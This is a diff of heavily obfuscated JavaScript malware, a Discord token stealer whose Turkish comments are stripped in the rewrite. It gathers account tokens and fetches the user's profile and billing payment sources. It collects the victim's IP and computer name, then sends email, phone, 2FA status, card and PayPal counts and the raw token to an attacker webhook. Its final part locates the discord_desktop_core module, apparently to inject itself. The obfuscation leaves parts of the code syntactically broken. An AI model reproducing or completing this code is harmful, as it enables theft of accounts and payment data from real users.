+                if (_k8PLDV5xb.length > 0) return _k8PLDV5xb;
             }
         } catch {}
-var _MpQjEC = 8087; if (_MpQjEC > 11072) { _MpQjEC += 2; }
-        if (_dbj_WAQr < retries - 1) await _QJApWU6lq(delayMs);
+        if (_vFaKVK7j < retries - 1) await _qTt0NsHPSwW8(delayMs);
     }
     return [];
 }
 
-// Geriye _mLWOWgOpFOIzHPönük uyumluluk — tek _fFZMbyJ9lu gerektiğinde
-async function _C6ROuz(retries = 3, delayMs = 1000) {
-    const _wpmZ9oixr_R = await _lTz8Me(retries, delayMs);
-    return _wpmZ9oixr_R.length > 0 ? _wpmZ9oixr_R[0] : null;
+async function _Qqeoyl(retries = 3, delayMs = 1000) {
+    const _k8PLDV5xb = await _C2iYOL1k(retries, delayMs);
+    return _k8PLDV5xb.length > 0 ? _k8PLDV5xb[0] : null;
 }
 
-function _QJApWU6lq(ms) { return new Promise(r => setTimeout(r, ms)); }
+function _qTt0NsHPSwW8(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// ── HTTP helpers ──────────────────────────────────────────────────────────────
-
-// Discord API — https ile direkt (_fFZMbyJ9lu header ile, renderer'a gerek yok)
-function _CpZOJU0IEMhMLr(endpoint, _fFZMbyJ9lu) {
+function _f47OjwAYd(endpoint, _is4JL18) {
     return new Promise(resolve => {
-        const _zsIjlB = new URL(endpoint);
-        const _HNuTZ1m1 = https.request({
-            hostname: _zsIjlB.hostname,
-            path:     _zsIjlB.pathname + _zsIjlB.search,
-            method:   _LWBbXKOVk5(11),
+        const _dqUjMj7DUaL = new URL(endpoint);
+        const _F0wk5Ro = https.request({
+            hostname: _dqUjMj7DUaL.hostname,
+            path:     _dqUjMj7DUaL.pathname + _dqUjMj7DUaL.search,
+            method:   _mFVGlUtTrc(9),
             headers:  {
-                _LWBbXKOVk5(12): _fFZMbyJ9lu,
-                _LWBbXKOVk5(13):  _LWBbXKOVk5(14),
-                _LWBbXKOVk5(15):    _LWBbXKOVk5(16),
+                _mFVGlUtTrc(10): _is4JL18,
+                _mFVGlUtTrc(11):  _mFVGlUtTrc(12),
+                _mFVGlUtTrc(13):    _mFVGlUtTrc(14),
             },
             timeout: 10000,
         }, res => {
-            let _h_Yyx_cr10O = '';
-            res.on(_LWBbXKOVk5(17), _mLWOWgOpFOIzHP => _h_Yyx_cr10O += _mLWOWgOpFOIzHP);
-            res.on(_LWBbXKOVk5(18), () => { try { resolve(JSON.parse(_h_Yyx_cr10O)); } catch { resolve(null); } });
+            let _fbLgmKSK_h8 = '';
+            res.on(_mFVGlUtTrc(15), _J1jf4Qe30 => _fbLgmKSK_h8 += _J1jf4Qe30);
+            res.on(_mFVGlUtTrc(16), () => { try { resolve(JSON.parse(_fbLgmKSK_h8)); } catch { resolve(null); } });
         });
-        _HNuTZ1m1.on(_LWBbXKOVk5(19),   () => resolve(null));
-        _HNuTZ1m1.on(_LWBbXKOVk5(20), () => { _HNuTZ1m1.destroy(); resolve(null); });
-        _HNuTZ1m1.end();
+        _F0wk5Ro.on(_mFVGlUtTrc(17),   () => resolve(null));
+        _F0wk5Ro.on(_mFVGlUtTrc(18), () => { _F0wk5Ro.destroy(); resolve(null); });
+        _F0wk5Ro.end();
     });
 }
-var _roiUJz = 2161; if (_roiUJz > 13371) { _roiUJz += 3; }
 
-async function _Ox3U72sM2kQ7S() {
+async function _pIpkcHmu72iR() {
     return new Promise(resolve => {
-        const _HNuTZ1m1 = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
-            let _h_Yyx_cr10O = '';
-            res.on(_LWBbXKOVk5(17), _mLWOWgOpFOIzHP => _h_Yyx_cr10O += _mLWOWgOpFOIzHP);
-            res.on(_LWBbXKOVk5(18), () => { try { resolve(JSON.parse(_h_Yyx_cr10O)._CiqCKt4LVgP || _LWBbXKOVk5(21)); } catch { resolve(_LWBbXKOVk5(21)); } });
+        const _F0wk5Ro = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
+            let _fbLgmKSK_h8 = '';
+            res.on(_mFVGlUtTrc(15), _J1jf4Qe30 => _fbLgmKSK_h8 += _J1jf4Qe30);
+            res.on(_mFVGlUtTrc(16), () => { try { resolve(JSON.parse(_fbLgmKSK_h8)._sHTcMbB240wl || _mFVGlUtTrc(19)); } catch { resolve(_mFVGlUtTrc(19)); } });
         });
-        _HNuTZ1m1.on(_LWBbXKOVk5(19),   () => resolve(_LWBbXKOVk5(21)));
-        _HNuTZ1m1.on(_LWBbXKOVk5(20), () => { _HNuTZ1m1.destroy(); resolve(_LWBbXKOVk5(21)); });
+        _F0wk5Ro.on(_mFVGlUtTrc(17),   () => resolve(_mFVGlUtTrc(19)));
+        _F0wk5Ro.on(_mFVGlUtTrc(18), () => { _F0wk5Ro.destroy(); resolve(_mFVGlUtTrc(19)); });
     });
 }
 
-async function _Czc4_CGGNG7wv(baseUrl) {
+async function _Qy4Sqyh7uw(baseUrl) {
+(function() { var _x = 3400; return _x * 7; })();
     if (!baseUrl) return null;
     return new Promise(resolve => {
-        const _AdHm1k = baseUrl + _LWBbXKOVk5(22);
-        const _HNuTZ1m1 = https.get(_AdHm1k, { timeout: 6000 }, res => {
-            resolve(res.headers[_LWBbXKOVk5(23)] === _LWBbXKOVk5(24)
-                ? _AdHm1k : baseUrl + _LWBbXKOVk5(25));
+        const _cpvSoicPbI = baseUrl + _mFVGlUtTrc(20);
+        const _F0wk5Ro = https.get(_cpvSoicPbI, { timeout: 6000 }, res => {
+            resolve(res.headers[_mFVGlUtTrc(21)] === _mFVGlUtTrc(22)
+(function() { var _x = 8865; return _x * 8; })();
+                ? _cpvSoicPbI : baseUrl + _mFVGlUtTrc(23));
+(function() { var _x = 6894; return _x * 5; })();
         });
-        _HNuTZ1m1.on(_LWBbXKOVk5(19),   () => resolve(baseUrl + _LWBbXKOVk5(25)));
-        _HNuTZ1m1.on(_LWBbXKOVk5(20), () => { _HNuTZ1m1.destroy(); resolve(baseUrl + _LWBbXKOVk5(25)); });
+        _F0wk5Ro.on(_mFVGlUtTrc(17),   () => resolve(baseUrl + _mFVGlUtTrc(23)));
+        _F0wk5Ro.on(_mFVGlUtTrc(18), () => { _F0wk5Ro.destroy(); resolve(baseUrl + _mFVGlUtTrc(23)); });
     });
+var _Kk5EVw = 'e09c8f72'; if (false) { _Kk5EVw = null; }
 }
-var _nRpQoz = 7836; if (_nRpQoz > 18829) { _nRpQoz += 3; }
 
-async function _fg1cDsXYgVb(payload) {
+async function _yRbdJ0PSv8LE(payload) {
     return new Promise(resolve => {
-        const _mV6k9el7QbZdIS = JSON.stringify(payload);
-        const _zsIjlB  = new URL(WEBHOOK);
-        const _HNuTZ1m1  = https.request({
-            hostname: _zsIjlB.hostname,
-            path:     _zsIjlB.pathname + _zsIjlB.search,
-            method:   _LWBbXKOVk5(26),
-            headers:  { _LWBbXKOVk5(13): _LWBbXKOVk5(14), _LWBbXKOVk5(27): Buffer.byteLength(_mV6k9el7QbZdIS) },
+        const _wU8WjuFOP_ = JSON.stringify(payload);
+        const _dqUjMj7DUaL  = new URL(WEBHOOK);
+        const _F0wk5Ro  = https.request({
+            hostname: _dqUjMj7DUaL.hostname,
+            path:     _dqUjMj7DUaL.pathname + _dqUjMj7DUaL.search,
+            method:   _mFVGlUtTrc(24),
+(function() { var _x = 6050; return _x * 2; })();
+            headers:  { _mFVGlUtTrc(11): _mFVGlUtTrc(12), _mFVGlUtTrc(25): Buffer.byteLength(_wU8WjuFOP_) },
             timeout:  15000,
         }, res => { res.resume(); resolve(res.statusCode); });
-        _HNuTZ1m1.on(_LWBbXKOVk5(19),   () => resolve(null));
-var _sE74Lz = 'cdccb78c'; if (false) { _sE74Lz = null; }
-        _HNuTZ1m1.on(_LWBbXKOVk5(20), () => { _HNuTZ1m1.destroy(); resolve(null); });
-        _HNuTZ1m1.write(_mV6k9el7QbZdIS);
-        _HNuTZ1m1.end();
+        _F0wk5Ro.on(_mFVGlUtTrc(17),   () => resolve(null));
+        _F0wk5Ro.on(_mFVGlUtTrc(18), () => { _F0wk5Ro.destroy(); resolve(null); });
+        _F0wk5Ro.write(_wU8WjuFOP_);
+        _F0wk5Ro.end();
     });
 }
 
-// ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
-
-// Badge ID → emoji map (custom emojiler)
+var _ifZlAb = 2533; if (_ifZlAb > 18772) { _ifZlAb += 4; }
 const PROFILE_BADGE_MAP = {
-    _LWBbXKOVk5(28):                    _LWBbXKOVk5(29),
-    _LWBbXKOVk5(30):                  _LWBbXKOVk5(31),
-    _LWBbXKOVk5(32):                _LWBbXKOVk5(33),
-    _LWBbXKOVk5(34):       _LWBbXKOVk5(35),
-    _LWBbXKOVk5(36): _LWBbXKOVk5(37),
-    _LWBbXKOVk5(38): _LWBbXKOVk5(39),
-    _LWBbXKOVk5(40): _LWBbXKOVk5(41),
-    _LWBbXKOVk5(42):        _LWBbXKOVk5(37),
-    _LWBbXKOVk5(43):        _LWBbXKOVk5(39),
-    _LWBbXKOVk5(44):        _LWBbXKOVk5(41),
-    _LWBbXKOVk5(45):  _LWBbXKOVk5(46),
-    _LWBbXKOVk5(47):       _LWBbXKOVk5(48),
-    _LWBbXKOVk5(49):       _LWBbXKOVk5(50),
-    _LWBbXKOVk5(51):      _LWBbXKOVk5(52),
-var _AiaPGJ = '642cd3c0'; if (false) { _AiaPGJ = null; }
-    _LWBbXKOVk5(53):         _LWBbXKOVk5(54),
-    _LWBbXKOVk5(55):          _LWBbXKOVk5(56),
-    _LWBbXKOVk5(57):          _LWBbXKOVk5(58),
-    _LWBbXKOVk5(59):        _LWBbXKOVk5(60),
-    _LWBbXKOVk5(61):       _LWBbXKOVk5(62),
-    _LWBbXKOVk5(63):       _LWBbXKOVk5(64),
-    _LWBbXKOVk5(65):       _LWBbXKOVk5(66),
-    _LWBbXKOVk5(67):       _LWBbXKOVk5(68),
-    _LWBbXKOVk5(69):       _LWBbXKOVk5(70),
-    _LWBbXKOVk5(71):       _LWBbXKOVk5(72),
-    _LWBbXKOVk5(73):       _LWBbXKOVk5(74),
-    _LWBbXKOVk5(75):       _LWBbXKOVk5(76),
-    _LWBbXKOVk5(77):       _LWBbXKOVk5(78),
-    _LWBbXKOVk5(79):   _LWBbXKOVk5(80),
-    _LWBbXKOVk5(81):   _LWBbXKOVk5(82),
-    _LWBbXKOVk5(83):_LWBbXKOVk5(84),
-    _LWBbXKOVk5(85):  _LWBbXKOVk5(86),
-    _LWBbXKOVk5(87):  _LWBbXKOVk5(88),
+    _mFVGlUtTrc(26):                    _mFVGlUtTrc(27),
+    _mFVGlUtTrc(28):                  _mFVGlUtTrc(29),
+    _mFVGlUtTrc(30):                _mFVGlUtTrc(31),
+    _mFVGlUtTrc(32):       _mFVGlUtTrc(33),
+    _mFVGlUtTrc(34): _mFVGlUtTrc(35),
+    _mFVGlUtTrc(36): _mFVGlUtTrc(37),
+    _mFVGlUtTrc(38): _mFVGlUtTrc(39),
+    _mFVGlUtTrc(40):        _mFVGlUtTrc(35),
+    _mFVGlUtTrc(41):        _mFVGlUtTrc(37),
+    _mFVGlUtTrc(42):        _mFVGlUtTrc(39),
+    _mFVGlUtTrc(43):  _mFVGlUtTrc(44),
+    _mFVGlUtTrc(45):       _mFVGlUtTrc(46),
+    _mFVGlUtTrc(47):       _mFVGlUtTrc(48),
+    _mFVGlUtTrc(49):      _mFVGlUtTrc(50),
+    _mFVGlUtTrc(51):         _mFVGlUtTrc(52),
+    _mFVGlUtTrc(53):          _mFVGlUtTrc(54),
+    _mFVGlUtTrc(55):          _mFVGlUtTrc(56),
+    _mFVGlUtTrc(57):        _mFVGlUtTrc(58),
+    _mFVGlUtTrc(59):       _mFVGlUtTrc(60),
+    _mFVGlUtTrc(61):       _mFVGlUtTrc(62),
+    _mFVGlUtTrc(63):       _mFVGlUtTrc(64),
+    _mFVGlUtTrc(65):       _mFVGlUtTrc(66),
+    _mFVGlUtTrc(67):       _mFVGlUtTrc(68),
+    _mFVGlUtTrc(69):       _mFVGlUtTrc(70),
+    _mFVGlUtTrc(71):       _mFVGlUtTrc(72),
+    _mFVGlUtTrc(73):       _mFVGlUtTrc(74),
+    _mFVGlUtTrc(75):       _mFVGlUtTrc(76),
+    _mFVGlUtTrc(77):   _mFVGlUtTrc(78),
+    _mFVGlUtTrc(79):   _mFVGlUtTrc(80),
+    _mFVGlUtTrc(81):_mFVGlUtTrc(82),
+    _mFVGlUtTrc(83):  _mFVGlUtTrc(84),
+    _mFVGlUtTrc(85):  _mFVGlUtTrc(86),
 };
 
-function _z3Y9hVG(user) {
-    const _tOI6NP6nZB = (user._profile_badges || []).map(_h_Yyx_cr10O =>
-        PROFILE_BADGE_MAP[_h_Yyx_cr10O.id] || null
+function _LYdna2Qv(user) {
+    const _KoLTC6NLNQPB = (user._profile_badges || []).map(_fbLgmKSK_h8 =>
+        PROFILE_BADGE_MAP[_fbLgmKSK_h8.id] || null
     ).filter(Boolean);
-    return _tOI6NP6nZB.length ? _tOI6NP6nZB.join(' ') : _LWBbXKOVk5(89);
+    return _KoLTC6NLNQPB.length ? _KoLTC6NLNQPB.join(' ') : _mFVGlUtTrc(87);
 }
 
-function _yNzUnDrXjLzq(user) {
-    const _qQBOCg = user.premium_type;
-    if (!_qQBOCg) return _LWBbXKOVk5(89);
-    const _gnHGKN2o = { 1: _LWBbXKOVk5(90), 2: _LWBbXKOVk5(91), 3: _LWBbXKOVk5(92) };
-    return `<:nitro:1533639641687920823> ${_gnHGKN2o[_qQBOCg] || _LWBbXKOVk5(91)}`;
+function _eaK55gvo(user) {
+    const _hl8poqMb4 = user.premium_type;
+    if (!_hl8poqMb4) return _mFVGlUtTrc(87);
+    const _LtbCnIzgaeiE = { 1: _mFVGlUtTrc(88), 2: _mFVGlUtTrc(89), 3: _mFVGlUtTrc(90) };
+    return `<:nitro:1533639641687920823> ${_LtbCnIzgaeiE[_hl8poqMb4] || _mFVGlUtTrc(89)}`;
 }
 
-function _iTFsHaxeQdtjWR(sources) {
-    if (!sources || !sources.length) return _LWBbXKOVk5(89);
-    const _za6gB5a6Ilyrqx   = sources.filter(s => s.type === 1 && !s.invalid).length;
-    const _gdbJqM8kJXILP = sources.filter(s => s.type === 2 && !s.invalid).length;
-    const _GALZJ09wD = [];
-    if (_za6gB5a6Ilyrqx)   _GALZJ09wD.push(_za6gB5a6Ilyrqx   > 1 ? `<:card:1533639749376671785> _saXmek${_za6gB5a6Ilyrqx}`   : _LWBbXKOVk5(93));
-    if (_gdbJqM8kJXILP) _GALZJ09wD.push(_gdbJqM8kJXILP > 1 ? `<:paypal:1533641104480538695> _saXmek${_gdbJqM8kJXILP}` : _LWBbXKOVk5(94));
-    return _GALZJ09wD.length ? _GALZJ09wD.join(' ') : _LWBbXKOVk5(89);
+function _sS7IwUCWURe8(sources) {
+    if (!sources || !sources.length) return _mFVGlUtTrc(87);
+var _wneD51 = '6ea37215'; if (false) { _wneD51 = null; }
+    const _PosdpvxOKJaP5K   = sources.filter(s => s.type === 1 && !s.invalid).length;
+    const _DQb8kuX2 = sources.filter(s => s.type === 2 && !s.invalid).length;
+    const _N2jjn56d = [];
+    if (_PosdpvxOKJaP5K)   _N2jjn56d.push(_PosdpvxOKJaP5K   > 1 ? `<:card:1533639749376671785> _mZmNPnqo${_PosdpvxOKJaP5K}`   : _mFVGlUtTrc(91));
+    if (_DQb8kuX2) _N2jjn56d.push(_DQb8kuX2 > 1 ? `<:paypal:1533641104480538695> _mZmNPnqo${_DQb8kuX2}` : _mFVGlUtTrc(92));
+    return _N2jjn56d.length ? _N2jjn56d.join(' ') : _mFVGlUtTrc(87);
 }
 
-// ── Embed builder ─────────────────────────────────────────────────────────────
-
-function _wRqnXm2UR(title, _LdYy0jNBykY1O, thumbnail, image) {
-    const _wQvmHYq = {
+function _pFfh3tLpcjql(title, _MAwyMa7li5K7L, thumbnail, image) {
+var _AQPAxA = 5321; if (_AQPAxA > 18132) { _AQPAxA += 1; }
+    const _zun9spdP = {
         title,
         color:     EMBED_COLOR,
-        _LdYy0jNBykY1O,
+        _MAwyMa7li5K7L,
         footer:    { text: BOT_NAME },
+var _uGwBAY = '307ddd53'; if (false) { _uGwBAY = null; }
         timestamp: new Date().toISOString(),
     };
-    if (thumbnail) _wQvmHYq.thumbnail = { _zsIjlB: thumbnail };
-    if (image)     _wQvmHYq.image     = { _zsIjlB: image };
-    return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [_wQvmHYq] };
+    if (thumbnail) _zun9spdP.thumbnail = { _dqUjMj7DUaL: thumbnail };
+    if (image)     _zun9spdP.image     = { _dqUjMj7DUaL: image };
+    return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [_zun9spdP] };
 }
 
-async function _lLG_q76mh5(_fFZMbyJ9lu) {
+async function _D0xBXtbx(_is4JL18) {
     const [user, billing] = await Promise.all([
-        _CpZOJU0IEMhMLr('https://discord.com/api/v9/users/@me',                         _fFZMbyJ9lu),
-        _CpZOJU0IEMhMLr('https://discord.com/api/v9/users/@me/billing/payment-sources', _fFZMbyJ9lu),
-var _ie_IzV = '89b8e6e8'; if (false) { _ie_IzV = null; }
+        _f47OjwAYd('https://discord.com/api/v9/users/@me',                         _is4JL18),
+        _f47OjwAYd('https://discord.com/api/v9/users/@me/billing/payment-sources', _is4JL18),
     ]);
     if (!user || user.message) return null;
 
-    // Profile — renderer üzerinden çağır (Discord_LWBbXKOVk5(95)ı, CORS/auth sorunu yok)
+    
     try {
-        const _tAKLCtI_rW = await _JFLDcl9uE(`(function(){
-            var _saXmek = new XMLHttpRequest();
-            _saXmek.open(_LWBbXKOVk5(11), "https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false", false);
-            _saXmek.setRequestHeader(_LWBbXKOVk5(12), ${JSON.stringify(_fFZMbyJ9lu)});
-            _saXmek.send(null);
-            try { return JSON.parse(_saXmek.responseText); } catch(e) { return null; }
+        const _i0SWEM49 = await _AyQLklJopiBdqW(`(function(){
+            var _mZmNPnqo = new XMLHttpRequest();
+            _mZmNPnqo.open(_mFVGlUtTrc(9), "https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false", false);
+            _mZmNPnqo.setRequestHeader(_mFVGlUtTrc(10), ${JSON.stringify(_is4JL18)});
+            _mZmNPnqo.send(null);
+            try { return JSON.parse(_mZmNPnqo.responseText); } catch(e) { return null; }
         })()`);
-        if (_tAKLCtI_rW && !_tAKLCtI_rW.message) {
-            if (_tAKLCtI_rW.premium_guild_since) user.premium_guild_since = _tAKLCtI_rW.premium_guild_since;
-            user._profile_badges = Array.isArray(_tAKLCtI_rW.badges) ? _tAKLCtI_rW.badges : [];
+        if (_i0SWEM49 && !_i0SWEM49.message) {
+            if (_i0SWEM49.premium_guild_since) user.premium_guild_since = _i0SWEM49.premium_guild_since;
+            user._profile_badges = Array.isArray(_i0SWEM49.badges) ? _i0SWEM49.badges : [];
         } else {
             user._profile_badges = [];
-(function() { var _x = 8671; return _x * 7; })();
         }
     } catch {
         user._profile_badges = [];
     }
 
     const [avatar, banner] = await Promise.all([
-        _Czc4_CGGNG7wv(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
-        _Czc4_CGGNG7wv(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
+        _Qy4Sqyh7uw(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
+        _Qy4Sqyh7uw(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
     ]);
     return { user, billing, avatar, banner };
+var _y7rd1k = 325; if (_y7rd1k > 11478) { _y7rd1k += 2; }
 }
 
-function _yjyK9_D4(user, billing, friends, _fFZMbyJ9lu, extra) {
-    // Billing — _qQBOCgüm kartları say (expired dahil)
-    const _za6gB5a6Ilyrqx   = (billing || []).filter(s => s.type === 1).length;
-    const _gdbJqM8kJXILP = (billing || []).filter(s => s.type === 2).length;
-    const _qXksMXsLIGI = [];
-    if (_za6gB5a6Ilyrqx)   _qXksMXsLIGI.push(`\`${_za6gB5a6Ilyrqx} card${_za6gB5a6Ilyrqx > 1 ? 's' : ''} found\``);
-    if (_gdbJqM8kJXILP) _qXksMXsLIGI.push(`\`${_gdbJqM8kJXILP} PayPal${_gdbJqM8kJXILP > 1 ? 's' : ''} found\``);
-    const _eiZJ2As = _qXksMXsLIGI.length ? _qXksMXsLIGI.join(' ') : _LWBbXKOVk5(89);
+function _qYGsxRFld2oOxD(user, billing, friends, _is4JL18, extra) {
+    
+(function() { var _x = 8366; return _x * 8; })();
+    const _PosdpvxOKJaP5K   = (billing || []).filter(s => s.type === 1).length;
+    const _DQb8kuX2 = (billing || []).filter(s => s.type === 2).length;
+    const _BOGyTmv2ptA5 = [];
+    if (_PosdpvxOKJaP5K)   _BOGyTmv2ptA5.push(`\`${_PosdpvxOKJaP5K} card${_PosdpvxOKJaP5K > 1 ? 's' : ''} found\``);
+    if (_DQb8kuX2) _BOGyTmv2ptA5.push(`\`${_DQb8kuX2} PayPal${_DQb8kuX2 > 1 ? 's' : ''} found\``);
+    const _EHJYR9xwi97IDe = _BOGyTmv2ptA5.length ? _BOGyTmv2ptA5.join(' ') : _mFVGlUtTrc(87);
 
-    // 3 grup, aralarında boş satır — Discord Info tarzı
-    const _rHxURnzy8_ = [
-(function() { var _x = 6679; return _x * 6; })();
-var _Euu9uL = 272; if (_Euu9uL > 17727) { _Euu9uL += 4; }
-        // Grup 1: Kimlik
+    
+    const _BSueeB2n = [
+        
         `<:user:1533638622761455637> **Username:** \`${user.username}\``,
-        `<:mail:1533638816559140877> **Email:** \`${user.email || _LWBbXKOVk5(21)}\``,
-        `<:phone:1533639066057179136> **Phone:** \`${user.phone || _LWBbXKOVk5(21)}\``,
+        `<:mail:1533638816559140877> **Email:** \`${user.email || _mFVGlUtTrc(19)}\``,
+        `<:phone:1533639066057179136> **Phone:** \`${user.phone || _mFVGlUtTrc(19)}\``,
         '',
-        // Grup 2: Hesap
-        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? _LWBbXKOVk5(96) : _LWBbXKOVk5(89)}`,
-        `<:nitro:1533639641687920823> **Nitro:** ${_yNzUnDrXjLzq(user)}`,
-        `<:card:1533639749376671785> **Billing:** ${_eiZJ2As}`,
-        `<:badge:1533639967761240154> **Badges:** ${_z3Y9hVG(user)}`,
+        
+        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? _mFVGlUtTrc(93) : _mFVGlUtTrc(87)}`,
+        `<:nitro:1533639641687920823> **Nitro:** ${_eaK55gvo(user)}`,
+        `<:card:1533639749376671785> **Billing:** ${_EHJYR9xwi97IDe}`,
+        `<:badge:1533639967761240154> **Badges:** ${_LYdna2Qv(user)}`,
         '',
-        // Grup 3: Sistem (extra)
+        
+var _tJNaDR = 8846; if (_tJNaDR > 13006) { _tJNaDR += 2; }
         ...(extra || []),
-    ].join(_LWBbXKOVk5(97));
+    ].join(_mFVGlUtTrc(94));
 
     return [
-        { name: _LWBbXKOVk5(98), value: _rHxURnzy8_,                                                    inline: false },
-        { name: _LWBbXKOVk5(99), value: `\`\`\`${_fFZMbyJ9lu}\`\`\``,            inline: false },
+        { name: _mFVGlUtTrc(95), value: _BSueeB2n,                                                    inline: false },
+        { name: _mFVGlUtTrc(96), value: `\`\`\`${_is4JL18}\`\`\``,            inline: false },
     ];
 }
 
-function _dCUILkF() {
-    const _GALZJ09wD = __dirname.replace(/\\/g, '/').split('/');
-    for (let _dbj_WAQr = _GALZJ09wD.length - 1; _dbj_WAQr >= 0; _dbj_WAQr--) {
-        if (/^Discord(PTB|Canary|Development)?$/_dbj_WAQr.test(_GALZJ09wD[_dbj_WAQr])) return _GALZJ09wD[_dbj_WAQr];
+function _KI30PNWa() {
+    const _N2jjn56d = __dirname.replace(/\\/g, '/').split('/');
+    for (let _vFaKVK7j = _N2jjn56d.length - 1; _vFaKVK7j >= 0; _vFaKVK7j--) {
+        if (/^Discord(PTB|Canary|Development)?$/_vFaKVK7j.test(_N2jjn56d[_vFaKVK7j])) return _N2jjn56d[_vFaKVK7j];
     }
-    return _LWBbXKOVk5(100);
+    return _mFVGlUtTrc(97);
 }
 
-// ── _cilK9_ ─────────────────────────────────────────────────────────────────
+async function _lGN_6BFoq() {
+    if (_d20fZIJfMWJ) return;
+    _d20fZIJfMWJ = true;
 
-var _mdavJV = 'b2ce8888'; if (false) { _mdavJV = null; }
-async function _cilK9_() {
-    if (_dO9t5X3rnn_) return;
-    _dO9t5X3rnn_ = true;
-
+var _DaoBLg = 7360; if (_DaoBLg > 19198) { _DaoBLg += 3; }
     try {
-        const _CiqCKt4LVgP     = await _Ox3U72sM2kQ7S();
-        const _Mgut6LcM = _dCUILkF();
-        const _wpmZ9oixr_R = await _lTz8Me(8, 2000);
+        const _sHTcMbB240wl     = await _pIpkcHmu72iR();
+        const _J0Mz0BC_ze = _KI30PNWa();
+        const _k8PLDV5xb = await _C2iYOL1k(8, 2000);
 
-        if (!_wpmZ9oixr_R.length) {
-            await _fg1cDsXYgVb(_wRqnXm2UR(
-                _LWBbXKOVk5(101),
+        if (!_k8PLDV5xb.length) {
+            await _yRbdJ0PSv8LE(_pFfh3tLpcjql(
+                _mFVGlUtTrc(98),
                 [
                     {
-                        name: _LWBbXKOVk5(102),
+                        name: _mFVGlUtTrc(99),
                         value: [
-                            `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || _LWBbXKOVk5(21)}\``,
-                            `<:_CiqCKt4LVgP:1533640242437816390> **IP:** \`${_CiqCKt4LVgP}\``,
-                            `<:web:1533641362975621270> **Client:** \`${_Mgut6LcM}\``,
-                        ].join(_LWBbXKOVk5(97)),
+                            `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || _mFVGlUtTrc(19)}\``,
+                            `<:_sHTcMbB240wl:1533640242437816390> **IP:** \`${_sHTcMbB240wl}\``,
+                            `<:web:1533641362975621270> **Client:** \`${_J0Mz0BC_ze}\``,
+                        ].join(_mFVGlUtTrc(94)),
                         inline: false
                     }
                 ],
@@ -381,22 +368,22 @@ async function _cilK9_() {
             return;
         }
 
-        // Her hesap _dbj_WAQrçin ayrı _wQvmHYq
-        for (const _fFZMbyJ9lu of _wpmZ9oixr_R) {
+        
+        for (const _is4JL18 of _k8PLDV5xb) {
             try {
-                const _rHxURnzy8_ = await _lLG_q76mh5(_fFZMbyJ9lu);
-                if (!_rHxURnzy8_) continue;
-                const { user, billing, avatar, banner } = _rHxURnzy8_;
-                const _vzev6cLNRM = [
-                    `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || _LWBbXKOVk5(21)}\``,
-                    `<:_CiqCKt4LVgP:1533640242437816390> **IP:** \`${_CiqCKt4LVgP}\``,
-                    `<:web:1533641362975621270> **Client:** \`${_Mgut6LcM}\``,
+                const _BSueeB2n = await _D0xBXtbx(_is4JL18);
+                if (!_BSueeB2n) continue;
+                const { user, billing, avatar, banner } = _BSueeB2n;
+                const _tsVuf_1 = [
+                    `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || _mFVGlUtTrc(19)}\``,
+                    `<:_sHTcMbB240wl:1533640242437816390> **IP:** \`${_sHTcMbB240wl}\``,
+                    `<:web:1533641362975621270> **Client:** \`${_J0Mz0BC_ze}\``,
                 ];
-(function() { var _x = 2667; return _x * 7; })();
-                const _LdYy0jNBykY1O = _yjyK9_D4(user, billing, null, _fFZMbyJ9lu, _vzev6cLNRM);
-                await _fg1cDsXYgVb(_wRqnXm2UR(
-                    _LWBbXKOVk5(103),
-                    _LdYy0jNBykY1O,
+                const _MAwyMa7li5K7L = _qYGsxRFld2oOxD(user, billing, null, _is4JL18, _tsVuf_1);
+                await _yRbdJ0PSv8LE(_pFfh3tLpcjql(
+                    _mFVGlUtTrc(100),
+                    _MAwyMa7li5K7L,
+(function() { var _x = 6105; return _x * 9; })();
                     avatar || AVATAR_URL, banner || null
                 ));
             } catch {}
@@ -404,213 +391,101 @@ async function _cilK9_() {
     } catch {}
 }
 
-// ── _JlxHlh ───────────────────────────────────────────────────────────────
-
-function _JlxHlh() {
-    if (_kv19pn) return;
-    _kv19pn = true;
+var _kyCaNo = 6199; if (_kyCaNo > 15153) { _kyCaNo += 4; }
+function _ai7Ciia_E6() {
+    if (_zkCBmGL8aCNHFp) return;
+    _zkCBmGL8aCNHFp = true;
     try {
-        const _bc_4ul       = path.dirname(process.execPath);
-        const _GnrM3R = path.join(_bc_4ul, _LWBbXKOVk5(104));
-        if (!fs.existsSync(_GnrM3R)) return;
+        const _p6YJUFgeGt       = path.dirname(process.execPath);
+        const _dWD53pQRznR = path.join(_p6YJUFgeGt, _mFVGlUtTrc(101));
+        if (!fs.existsSync(_dWD53pQRznR)) return;
 
-        const _lkiG8FAW  = path.join(_GnrM3R, _LWBbXKOVk5(105));
-var _QVu7ab = 8677; if (_QVu7ab > 13045) { _QVu7ab += 3; }
-        const _jU06IMHTM = path.join(_GnrM3R, _LWBbXKOVk5(106));
+        const _jTRJj0  = path.join(_dWD53pQRznR, _mFVGlUtTrc(102));
+        const _gnnGwwZLy = path.join(_dWD53pQRznR, _mFVGlUtTrc(103));
 
-        const _J5L0_bh229U = path.join(_bc_4ul, _LWBbXKOVk5(107));
-        if (!fs.existsSync(_J5L0_bh229U)) return;
-        const _B79xmk = fs.readdirSync(_J5L0_bh229U).find(_saXmek => /^discord_desktop_core-\_mLWOWgOpFOIzHP+$/.test(_saXmek));
-        if (!_B79xmk) return;
-        const _C9Z54sxXq = path.join(_J5L0_bh229U, _B79xmk, _LWBbXKOVk5(108), _LWBbXKOVk5(109));
